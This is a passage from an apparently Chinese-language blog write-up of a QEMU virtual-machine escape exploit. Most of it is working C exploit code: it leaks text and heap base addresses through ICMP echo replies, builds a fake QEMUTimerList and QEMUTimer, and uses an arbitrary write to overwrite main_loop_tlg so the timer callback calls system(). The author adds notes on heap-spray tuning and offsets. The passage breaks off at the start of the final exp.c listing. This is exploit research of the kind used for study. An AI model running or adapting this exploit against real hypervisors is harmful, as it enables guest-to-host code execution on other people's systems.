<span class="title">ip</span> *<span class="title">recv_iphdr</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">icmp</span> *<span class="title">recv_icmphdr</span>;</span></span><br><span class="line">    <span class="keyword">uint8_t</span> recv_ether_frame[IP_MAXPACKET];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> <span class="title">from</span>;</span></span><br><span class="line">    <span class="keyword">socklen_t</span> fromlen;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timeval</span> <span class="title">wait</span>, <span class="title">t1</span>, <span class="title">t2</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timezone</span> <span class="title">tz</span>;</span></span><br><span class="line">    <span class="keyword">double</span> dt;</span><br><span class="line"></span><br><span class="line">    (<span class="keyword">void</span>)gettimeofday(&amp;t1, &amp;tz);</span><br><span class="line">    wait.tv_sec = <span class="number">2</span>;</span><br><span class="line">    wait.tv_usec = <span class="number">0</span>;</span><br><span class="line">    setsockopt(recvsd, SOL_SOCKET, SO_RCVTIMEO, (<span class="keyword">char</span> *)&amp;wait,</span><br><span class="line">               <span class="keyword">sizeof</span>(struct timeval));</span><br><span class="line">    recv_iphdr = (struct ip *)(recv_ether_frame + ETH_HDRLEN);</span><br><span class="line">    recv_icmphdr = (struct icmp *)(recv_ether_frame + ETH_HDRLEN + IP4_HDRLEN);</span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">memset</span>(recv_ether_frame, <span class="number">0</span>, IP_MAXPACKET * <span class="keyword">sizeof</span>(<span class="keyword">uint8_t</span>));</span><br><span class="line">        <span class="built_in">memset</span>(&amp;from, <span class="number">0</span>, <span class="keyword">sizeof</span>(from));</span><br><span class="line">        fromlen = <span class="keyword">sizeof</span>(from);</span><br><span class="line">        <span class="keyword">if</span> ((bytes = recvfrom(recvsd, recv_ether_frame, IP_MAXPACKET, <span class="number">0</span>,</span><br><span class="line">                              (struct sockaddr *)&amp;from, &amp;fromlen)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            status = errno;</span><br><span class="line">            <span class="keyword">if</span> (status == EAGAIN) &#123; <span class="comment">// EAGAIN = 11</span></span><br><span class="line">                dbg_printf(<span class="string">"No reply within %li seconds.\n"</span>, wait.tv_sec);</span><br><span class="line">                <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (status == EINTR) &#123; <span class="comment">// EINTR = 4</span></span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                perror(<span class="string">"recvfrom() failed "</span>);</span><br><span class="line">                <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="comment">// End of error handling conditionals.</span></span><br><span class="line">        <span class="comment">// hexdump("recv", recv_ether_frame, 0x50);</span></span><br><span class="line">        dbg_printf(<span class="string">"recv count %d\n"</span>, count++);</span><br><span class="line">        <span class="keyword">if</span> ((((recv_ether_frame[<span class="number">12</span>] &lt;&lt; <span class="number">8</span>) + recv_ether_frame[<span class="number">13</span>]) ==</span><br><span class="line">             ETH_P_IP) &amp;&amp;</span><br><span class="line">            (recv_iphdr-&gt;ip_p == IPPROTO_ICMP) &amp;&amp;</span><br><span class="line">            (recv_icmphdr-&gt;icmp_type == ICMP_ECHOREPLY)) &#123;</span><br><span class="line">            <span class="comment">// Stop timer and calculate how long it took to get a reply.</span></span><br><span class="line">            (<span class="keyword">void</span>)gettimeofday(&amp;t2, &amp;tz);</span><br><span class="line">            dt = (<span class="keyword">double</span>)(t2.tv_sec - t1.tv_sec) * <span class="number">1000.0</span> +</span><br><span class="line">                 (<span class="keyword">double</span>)(t2.tv_usec - t1.tv_usec) / <span class="number">1000.0</span>;</span><br><span class="line">            <span class="comment">// 底下这个可能会segfault</span></span><br><span class="line">            <span class="comment">// if (inet_ntop(AF_INET, &amp;(recv_iphdr-&gt;ip_src.s_addr), rec_ip,</span></span><br><span class="line">            <span class="comment">// INET_ADDRSTRLEN) == NULL) &#123;</span></span><br><span class="line">            <span class="comment">//     status = errno;</span></span><br><span class="line">            <span class="comment">//     fprintf(stderr, "inet_ntop() failed.\nError message: %s",</span></span><br><span class="line">            <span class="comment">//     strerror(status)); exit(EXIT_FAILURE);</span></span><br><span class="line">            <span class="comment">// &#125;</span></span><br><span class="line">            dbg_printf(<span class="string">"%g ms (%i bytes received)\n"</span>, dt, bytes);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUG</span></span><br><span class="line">            hexdump(<span class="string">"ping recv"</span>, recv_ether_frame, bytes);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">            <span class="keyword">if</span> (bytes &lt; <span class="number">0x200</span>)</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="comment">//7e 64 cb 55 55 55</span></span><br><span class="line">            <span class="comment">//text_base =</span></span><br><span class="line">            <span class="comment">//    ((*(uint64_t *)(recv_ether_frame + 0x88)) - 0x76247e) &amp; ~0xfff;</span></span><br><span class="line">            <span class="comment">//heap_base = (*(uint64_t *)(recv_ether_frame + 0x90)) &amp; ~0xffffff;</span></span><br><span class="line"></span><br><span class="line">            text_base = <span class="number">0</span>;</span><br><span class="line">            heap_base = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">uint64_t</span>* tmp_ptr = <span class="literal">NULL</span>;</span><br><span class="line">            <span class="keyword">uint64_t</span> tmp_addr = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">846</span>;i += <span class="number">8</span>)&#123;</span><br><span class="line">                tmp_ptr = recv_ether_frame + i;</span><br><span class="line">                tmp_addr = *tmp_ptr;</span><br><span class="line">                <span class="keyword">if</span>(text_base != <span class="number">0</span> &amp;&amp; heap_base != <span class="number">0</span>)&#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"%d: %p\n"</span>,i,tmp_addr);</span><br><span class="line">                <span class="keyword">if</span>(tmp_addr &gt; <span class="number">0x550000000000</span> &amp;&amp; ((tmp_addr&amp;<span class="number">0xfff</span>) == <span class="number">0x47e</span>))&#123;</span><br><span class="line">                    text_base = tmp_addr - <span class="number">0x76247e</span>;</span><br><span class="line">                    heap_base = (*(<span class="keyword">uint64_t</span>*)(recv_ether_frame + i + <span class="number">8</span>)) &amp; ~<span class="number">0xffffff</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(text_base == <span class="number">0</span>)&#123;</span><br><span class="line">                perror(<span class="string">"leak error...."</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//getchar();</span></span><br><span class="line"></span><br><span class="line">            dbg_printf(<span class="string">"leak text_base: 0x%lx\n"</span></span><br><span class="line">                       <span class="string">"leak heap_base: 0x%lx\n"</span>,</span><br><span class="line">                       text_base, heap_base);</span><br><span class="line">            <span class="comment">// getchar();</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125; <span class="comment">// End if IP ethernet frame carrying ICMP_ECHOREPLY</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    close(s);</span><br><span class="line">    close(recvsd);</span><br><span class="line">    <span class="built_in">free</span>(payload_start);</span><br><span class="line">    <span class="keyword">if</span>(stop_flag)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"trigger!"</span>);</span><br><span class="line">        getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="PC-control"><a href="#PC-control" class="headerlink" title="PC control"></a>PC control</h3><p>关于<code>qemu</code>计时器方面的知识可以看我之前的文章。</p>
<p>在<code>bss</code>段有个全局数组<code>main_loop_tlg</code>，它是<code>QEMUTimerList</code>的数组。我们可以在堆中伪造一个<code>QEMUTimerList</code>，将<code>cb</code>指针覆盖成想要执行的函数，<code>opaque</code>为参数地址。再将其地址覆盖到<code>main_loop_tlg</code>中，等<code>expire_time</code>时间到，将会执行<code>cb(opaque)</code>，成功控制程序执行流。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// util/qemu-timer.c</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">QEMUTimerList</span> &#123;</span></span><br><span class="line">    QEMUClock *clock;</span><br><span class="line">    QemuMutex active_timers_lock;</span><br><span class="line">    QEMUTimer *active_timers;</span><br><span class="line">    QLIST_ENTRY(QEMUTimerList) <span class="built_in">list</span>;</span><br><span class="line">    QEMUTimerListNotifyCB *notify_cb;</span><br><span class="line">    <span class="keyword">void</span> *notify_opaque;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* lightweight method to mark the end of timerlist's running */</span></span><br><span class="line">    QemuEvent timers_done_ev;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// include/qemu/timer.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">QEMUTimer</span> &#123;</span></span><br><span class="line">    <span class="keyword">int64_t</span> expire_time;        <span class="comment">/* in nanoseconds */</span></span><br><span class="line">    QEMUTimerList *timer_list;</span><br><span class="line">    QEMUTimerCB *cb;  <span class="comment">// 函数指针</span></span><br><span class="line">    <span class="keyword">void</span> *opaque;     <span class="comment">// 参数</span></span><br><span class="line">    QEMUTimer *next;</span><br><span class="line">    <span class="keyword">int</span> attributes;</span><br><span class="line">    <span class="keyword">int</span> scale;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><code>exp</code>中对应的部分：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// fake timer_list</span></span><br><span class="line"><span class="comment">/* gdb-peda$ p *timer_list</span></span><br><span class="line"><span class="comment">$45 = &#123;</span></span><br><span class="line"><span class="comment">    clock = 0x55a8d1473380 &lt;qemu_clocks&gt;,</span></span><br><span class="line"><span class="comment">    active_timers_lock = &#123;</span></span><br><span class="line"><span class="comment">        lock = pthread_mutex_t = &#123;</span></span><br><span class="line"><span class="comment">        Type = Normal,</span></span><br><span class="line"><span class="comment">        Status = Not acquired,</span></span><br><span class="line"><span class="comment">        Robust = No,</span></span><br><span class="line"><span class="comment">        Shared = No,</span></span><br><span class="line"><span class="comment">        Protocol = None</span></span><br><span class="line"><span class="comment">        &#125;,</span></span><br><span class="line"><span class="comment">        file = 0x0,</span></span><br><span class="line"><span class="comment">        line = 0x0,</span></span><br><span class="line"><span class="comment">        initialized = 0x1</span></span><br><span class="line"><span class="comment">    &#125;,</span></span><br><span class="line"><span class="comment">    active_timers = 0x55a8d3641df0,</span></span><br><span class="line"><span class="comment">    list = &#123;</span></span><br><span class="line"><span class="comment">        le_next = 0x0,</span></span><br><span class="line"><span class="comment">        le_prev = 0x55a8d2594cb8</span></span><br><span class="line"><span class="comment">    &#125;,</span></span><br><span class="line"><span class="comment">    notify_cb = 0x55a8d076c793 &lt;qemu_timer_notify_cb&gt;,</span></span><br><span class="line"><span class="comment">    notify_opaque = 0x0,</span></span><br><span class="line"><span class="comment">    timers_done_ev = &#123;</span></span><br><span class="line"><span class="comment">        value = 0x0,</span></span><br><span class="line"><span class="comment">        initialized = 0x1</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">&#125; */</span></span><br><span class="line"><span class="keyword">uint64_t</span> fake_timer_list = heap_base + <span class="number">0x1000</span>;</span><br><span class="line">*(<span class="keyword">uint64_t</span> *)buf = text_base +  <span class="number">0x11f8e80</span>; <span class="comment">// qemu_clocks 0x11f8e80</span></span><br><span class="line"><span class="built_in">memset</span>(buf + <span class="number">8</span>, <span class="number">0</span>, <span class="number">8</span> * <span class="number">6</span>);</span><br><span class="line">*(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x38</span>) = <span class="number">0x0000000100000000</span>;</span><br><span class="line">*(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x40</span>) = fake_timer_list + <span class="number">0x70</span>; <span class="comment">// active_timers</span></span><br><span class="line">*(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x48</span>) = <span class="number">0</span>;</span><br><span class="line">*(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x50</span>) = <span class="number">0</span>;</span><br><span class="line">*(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x58</span>) = text_base + <span class="number">0x2f2ee0</span>; <span class="comment">// qemu_timer_notify_cb 0x2f2ee0</span></span><br><span class="line">*(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x60</span>) = <span class="number">0</span>;</span><br><span class="line">*(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x68</span>) = <span class="number">0x0000000100000000</span>;</span><br><span class="line"><span class="comment">// end of timer_list</span></span><br><span class="line"><span class="comment">// start of active_timers</span></span><br><span class="line"><span class="comment">/* gdb-peda$ p *timer_list-&gt;active_timers</span></span><br><span class="line"><span class="comment">$49 = &#123;</span></span><br><span class="line"><span class="comment">    expire_time = 0x22823f5aad00,</span></span><br><span class="line"><span class="comment">    timer_list = 0x55a8d2594840,</span></span><br><span class="line"><span class="comment">    cb = 0x55a8d0b66a82 &lt;gui_update&gt;,</span></span><br><span class="line"><span class="comment">    opaque = 0x55a8d3ae6e50,</span></span><br><span class="line"><span class="comment">    next = 0x55a8d3ae6e80,</span></span><br><span class="line"><span class="comment">    attributes = 0x0,</span></span><br><span class="line"><span class="comment">    scale = 0xf4240</span></span><br><span class="line"><span class="comment">&#125; */</span></span><br><span class="line">*(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x70</span>) = <span class="number">0</span>; <span class="comment">// expire_time set to 0 will trigger func cb</span></span><br><span class="line">*(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x78</span>) = fake_timer_list;</span><br><span class="line">*(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x80</span>) = text_base + <span class="number">0x2a3720</span>;    <span class="comment">// system plt</span></span><br><span class="line">*(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x88</span>) = heap_base + <span class="number">0xe42</span>; <span class="comment">// parameter address</span></span><br><span class="line">*(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x90</span>) = <span class="number">0</span>;</span><br><span class="line">*(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x98</span>) = <span class="number">0x000f424000000000</span>;</span><br><span class="line">g_spray_ip_id = <span class="number">0xccbb</span>;</span><br><span class="line">arbitrary_write(fake_timer_list<span class="number">-0x318</span>,<span class="number">8</span>,buf,<span class="number">0xa0</span>,<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// dbg_printf("check heap here");</span></span><br><span class="line"><span class="comment">// qemu timer</span></span><br><span class="line"><span class="comment">// 改掉全局的main_loop_tlg</span></span><br><span class="line">*(<span class="keyword">uint64_t</span> *)buf = fake_timer_list; <span class="comment">// qemu_clocks</span></span><br><span class="line">g_spray_ip_id = <span class="number">0xddbb</span>;</span><br><span class="line">arbitrary_write(text_base+<span class="number">0x11f8e60</span><span class="number">-0x318</span>,<span class="number">8</span>,buf,<span class="number">8</span>,<span class="number">0x20</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<p>最终<code>exp.c</code>：</p>
<p>这个利用我从学习基础知识到最终调出来断断续续持续了大概小一周了。。期间数次想过放弃，但是最后还是气不过，不过比较幸运最后终于成功了：</p>
<p><img src="https://s3.ax1x.com/2021/02/26/yz765F.png" alt="yz765F.png"></p>
<p>主要有以下几个问题：</p>
<ol>
<li><code>malloc</code>原语喷的次数，这是第一步，也是最重要的一步，这里卡了挺久的，开始的时候我直接拿<code>0xKira</code>的原<code>exp</code>去调，然后发现喷完<code>0x250</code>次之后线程堆依然很混乱，然后就把喷射次数直接改成了<code>0x500</code>，然后发现依然很混乱，改成<code>0x1000</code>之后发现比之前还要混乱，然后就很迷，后来看到<code>raycp</code>师傅的<code>exp</code>，发现他的喷射次数是<code>0x300</code>，而他是<code>18.04</code>的环境，所以我猜测这个数值可能和环境有关，我是在<code>16.04</code>上调的，原作者大概率不是<code>16.04</code>这么老的版本，所以我就从<code>0x200</code>一直加<code>0x50</code>次往后试探，多次尝试后发现我本机在<code>0x350~0x400</code>之间喷射成功的概率大一点，再多或者少的话就没成功过了，太少应该是因为碎片还没喷完，太多是因为原有堆空间不够，程序又申请了新的堆出来，又有大量新的碎片产生，而且发现一个规律：启动虚拟机后直接跑的成功概率较小，启动虚拟机之后先清空原有<code>exp</code>，然后重新把写好的<code>exp</code>复制粘贴过去然后再保存，再用<code>gcc</code>编译，再<code>ifconfig enp0s3 mtu 9000 up</code>，再跑<code>exp</code>，成功的概率会大很多。。。感觉是跑<code>exp</code>之前的操作对线程的堆起到了进一步稳定的作用。。。具体我也就不知道了orz。</li>
<li><code>Infoleak</code>时的数据非常没有规律，非常非常看脸，其实这一步的成功率就是由上一步的堆喷导致的，只有上一步的喷射使堆变的稳定了，<code>exp</code>的<code>chunk</code>构造才会对的上号，才会成功<code>leak</code>出数据，然而<code>leak</code>出的数据绝大情况都是没有规律的，数据中的确是有<code>heap_base</code>和<code>text_base</code>的，但是这些数据并不是一个固定的变量和数值什么的，每次几乎都不一样，但是运气好是会有一样的，概率很低，我就找了一个我见到泄露出两次的一个<code>text</code>里的变量，其<code>+8</code>的位置是<code>heap</code>的变量，但概率真的感人。(其实我是前一天晚上看到这个变量被泄露出两次，然后第二天早上起来试了一上午这个变量都没有再出现过，后来再出现的那一次就是我成功的那一次了。)，失败的时候<code>qemu</code>经常会直接卡死，强制关闭进程再跑就行，比较麻烦。</li>
<li>最后劫持控制流时的指针需要根据自己编译的<code>qemu-system-x86_64</code>修改，有<code>system@plt</code>，<code>qemu_clocks</code>，<code>qemu_timer_notify_cb</code>以及最后一次<code>arbirary_write</code>时写的目标地址为<code>main_loop_tlg</code>(其地址为<code>qemu_clocks-0x20</code>)，而且成功与否也需要一点运气，但如果泄露成功的话，这里成功的概率会很大。</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span 